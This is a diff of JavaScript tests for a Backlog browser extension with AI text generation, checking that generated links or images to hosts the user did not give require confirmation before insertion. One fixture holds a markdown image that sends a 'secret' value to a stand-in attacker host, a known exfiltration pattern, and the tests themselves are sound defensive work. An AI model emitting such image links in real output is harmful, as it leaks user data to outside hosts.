@@ -267,6 +267,56 @@ test('returning to a long-idle tab checks settings once and never generates auto
   assert.deepEqual({...app.ping()}, {ok: true, version: 1});
 });
 
+test('returning to a non-issue Backlog page never contacts the extension', async () => {
+  const app = harness();
+  await flush();
+  app.navigate('/projects/TEST');
+  await flush();
+  const before = app.messages.length;
+  app.visibility('visible');
+  app.focus();
+  await flush();
+  assert.equal(app.messages.length, before);
+});
+
+test('generated links or images to hosts the user did not provide need confirmation before insertion', async () => {
+  const cancelled = harness();
+  await flush();
+  cancelled.type('.bcr-instruction', '資料 https://docs.example.org/a.pdf を案内して');
+  const pending = cancelled.submit();
+  await flush();
+  cancelled.finish({text: '資料は https://docs.example.org/a.pdf と [TEST-1](https://example.backlog.com/view/TEST-1) です。\n![](https://evil.example/p.png?d=secret)'});
+  await pending;
+  assert.equal(cancelled.confirmations.length, 1);
+  assert.match(cancelled.confirmations[0], /evil\.example/);
+  assert.doesNotMatch(cancelled.confirmations[0], /docs\.example\.org|example\.backlog\.com|secret/);
+  assert.equal(cancelled.editor.value, '');
+  assert.match(cancelled.control('.bcr-status').textContent, /外部URLを含むため.*キャンセル/);
+
+  const accepted = harness({confirmOverwrite: true});
+  await flush();
+  accepted.type('.bcr-instruction', '資料を案内して');
+  const running = accepted.submit();
+  await flush();
+  accepted.finish({text: '![](//cdn.evil.example/p.png)'});
+  await running;
+  assert.equal(accepted.confirmations.length, 1);
+  assert.match(accepted.confirmations[0], /cdn\.evil\.example/);
+  assert.equal(accepted.editor.value, '![](//cdn.evil.example/p.png)');
+  assert.match(accepted.control('.bcr-status').textContent, /外部URLの宛先/);
+
+  const trusted = harness();
+  await flush();
+  trusted.type('.bcr-instruction', '資料 https://docs.example.org/a.pdf を案内して');
+  const plain = trusted.submit();
+  await flush();
+  trusted.finish({text: '資料はhttps://docs.example.org/b.pdfです。https://example.backlog.com/view/TEST-1 も参照。A//B'});
+  await plain;
+  assert.equal(trusted.confirmations.length, 0);
+  assert.match(trusted.editor.value, /docs\.example\.org\/b\.pdf/);
+  assert.doesNotMatch(trusted.control('.bcr-status').textContent, /外部URL/);
+});
+
 test('settings reconnect retries transient missing receivers without showing a stale error', async () => {
   let attempts = 0;
   const app = harness({getSettings: () => {
